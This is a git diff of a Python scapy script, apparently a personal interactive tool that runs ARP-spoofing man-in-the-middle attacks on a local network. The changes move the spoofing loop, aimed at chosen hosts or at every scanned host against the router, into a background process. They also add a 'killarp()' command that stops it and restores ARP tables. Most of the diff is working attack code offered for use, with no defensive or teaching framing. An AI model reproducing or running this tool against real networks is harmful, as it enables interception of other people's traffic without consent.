@@ -4,6 +4,7 @@ import scapy.all as scapy  # handle tasks like scanning and network discovery
 import re  # regular expressions
 import time  # use sleep() for delays
 import sys  # info about the os
+import multiprocessing
 
 
 # function that returns a list with responses from a broadcast
@@ -72,7 +73,7 @@ def get_mac(ip):
         print("[!] No response..")
 
 
-# function that creates a man in the middle
+# function that spoofs IPs
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
 
@@ -91,7 +92,6 @@ def restore(dst_ip, src_ip):
 
 # function that creates a Man in the Middle
 def arp_spoof(targets, src):
-    sent_packets_count = 0
     if SYS_PLATFORM == 'linux':
         print('This is Linux OS')
         try:
@@ -102,11 +102,9 @@ def arp_spoof(targets, src):
                     if target_ip != router_ip:
                         spoof(target_ip, src)
                         spoof(src, target_ip)
-                        sent_packets_count += 2
-                print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # dynamic print
                 time.sleep(2)  # 2 seconds delay
-        except KeyboardInterrupt:
-            print("\n[!] Detected CTRL + C ... Resetting ARP Tables...")
+        except Exception:
+            print("\n[!] Something went wrong ... Resetting ARP Tables...")
             for target_ip in targets:
                 if target_ip != router_ip:
                     restore(target_ip, src)
@@ -118,48 +116,16 @@ def arp_spoof(targets, src):
         print('This is Windows OS')
 
 
-# class ArpSpoof:
-#     def __init__(self, targets, src):
-#         print("[+] Initializing Man-In-The-Middle...")
-#         self.source = src
-#         self.targets = targets
-#
-#     def run(self):
-#         sent_packets_count = 0
-#         if SYS_PLATFORM == 'linux':
-#             print('This is Linux OS')
-#             try:
-#                 with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-#                     f.write("1")  # enable ip forwarding to allow flow of packets through machine
-#                 while True:
-#                     for target_ip in self.targets:
-#                         if target_ip != router_ip:
-#                             spoof(target_ip, self.source)
-#                             spoof(self.source, target_ip)
-#                             sent_packets_count += 2
-#                     print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # dynamic print
-#                     time.sleep(2)  # 2 seconds delay
-#             except KeyboardInterrupt:
-#                 print("\n[!] Detected CTRL + C ... Resetting ARP Tables...")
-#                 for target_ip in self.targets:
-#                     if target_ip != router_ip:
-#                         restore(target_ip, self.source)
-#                         restore(self.source, target_ip)
-#                 print("[+] Done!")
-#                 with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-#                     f.write("0")  # disable ip forwarding
-#         elif SYS_PLATFORM == 'win32':
-#             print('This is Windows OS')
-
-
-# -----------------------------INITIALIZE VARIABLES-----------------------------
+########################
+# INITIALIZE VARIABLES #
+########################
 SYS_PLATFORM = sys.platform  # os of the current machine
 command = ''  # command to be executed
+allow = 1  # flag that shows if an arp spoof is already running
 scan_result = []  # list of network IPs
 router_ip = scapy.conf.route.route("0.0.0.0")[2]  # Router's ip
-# ------------------------------------------------------------------------------
 
-# --------------------------------MENU INTERFACE--------------------------------
+
 print('Welcome back Boss!')
 while True:
     print("Insert your command:")
@@ -174,29 +140,56 @@ while True:
         scan_result = network_scanner()
 
     elif command == "arpspoof()":
-        if scan_result:
-            option = ''
-            while option != 'auto' and option != 'man':
-                print('Type "man" or "auto" for arpspoof()')
-                option = input(">> Option: ")
-            if option == 'man':
-                scan_ip = []
-                target, source = ip_input(scan_result)
-                while target not in scan_result or source not in scan_result:
-                    print("[-] IPs not found in list. Try again")
-                    time.sleep(0.1)
+        if allow:
+            if scan_result:
+                option = ''
+                while option != 'auto' and option != 'man':
+                    print('Type "man" or "auto" for arpspoof()')
+                    option = input(">> Option: ")
+                if option == 'man':
+                    selected = []
                     target, source = ip_input(scan_result)
-                scan_ip.append(target)
-                arp_spoof(scan_ip, source)
-            elif option == 'auto':
-                if router_ip:
-                    arp_spoof(scan_result, router_ip)
-                else:
-                    print("[-] Router IP not found. Choose manually..")
-                    time.sleep(0.1)
+                    while target not in scan_result or source not in scan_result:
+                        print("[-] IPs not found in list. Try again")
+                        time.sleep(0.1)
+                        target, source = ip_input(scan_result)
+                    selected.append(target)
+                    arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, source))
+                    arp_process.start()
+                    allow = 0
+                elif option == 'auto':
+                    if router_ip:
+                        source = router_ip
+                        selected = scan_result
+                        arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, source))
+                        arp_process.start()
+                        allow = 0
+                    else:
+                        print("[-] Router IP not found. Choose manually..")
+                        time.sleep(0.1)
+            else:
+                print("[-] Network IPs not defined. Please scan() first.")
+                time.sleep(0.1)
         else:
-            print("[-] Network IPs not defined. Please scan() first.")
-            time.sleep(0.1)
+            print('[!] Arp spoof already running.')
+
+    elif command == 'killarp()':
+        try:
+            if arp_process.is_alive():
+                arp_process.terminate()
+                print("\n[!] Arp process terminated ... Resetting ARP Tables...")
+                for target_ip in selected:
+                    if target_ip != router_ip:
+                        restore(target_ip, source)
+                        restore(source, target_ip)
+                print("[+] Done!")
+                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+                    f.write("0")  # disable ip forwarding
+                allow = 1
+            else:
+                print('[-] No arp spoof running at the moment.')
+        except NameError:
+            print('[-] No arp spoof running at the moment.')
 
     elif command == "help()":
         print("----------------------------------")
@@ -205,6 +198,7 @@ while True:
         print("help()          Show commands")
         print("scan()          Network scanning")
         print("arpspoof()      Manual or Auto MITM Attack")
+        print("killarp()       Kill process running MITM Attack")
         print("exit()          Exit the app")
         print("----------------------------------")
 
@@ -213,4 +207,3 @@ while True:
 
     # except Exception:
     #     print('[-] Error during command execution.')
-# ------------------------------------------------------------------------------
